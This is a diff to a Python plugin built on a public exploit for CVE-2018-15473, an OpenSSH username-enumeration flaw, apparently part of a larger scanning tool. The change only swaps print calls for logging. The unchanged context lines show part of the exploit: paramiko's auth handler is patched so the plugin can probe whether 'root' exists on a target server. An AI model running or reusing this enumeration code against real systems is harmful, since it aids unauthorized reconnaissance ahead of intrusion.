@@ -15,7 +15,7 @@ https://github.com/Rhynorater/CVE-2018-15473-Exploit
 
 import warnings
 import paramiko
-import core.logger as log
+import logging as log
 from .IPlugin import IPlugin, connection_type
 
 old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
@@ -46,15 +46,15 @@ def checkUsername(socket, username, tried=0):
 		transport.start_client()
 		a = transport.get_banner()
 		if a:
-			print("BANNER=>", a)
+			log.debug("BANNER=>", a)
 	except paramiko.ssh_exception.SSHException:
-		print("EXCEPTION no ", tried)
+		log.debug("EXCEPTION no ", tried)
 		transport.close()
 		if tried < 3:
 			tried += 1
 			return checkUsername(socket, username, tried)
 		else:
-			print ('[-] Failed to negotiate SSH transport')
+			log.debug ('[-] Failed to negotiate SSH transport')
 
 	try:
 		transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
@@ -77,5 +77,5 @@ class Plugin(IPlugin):
 	def exec(self, socket):
 		res = checkUsername(socket, "root")
 		if res:
-			print("->",res)
+			log.debug("->",res)
 		pass
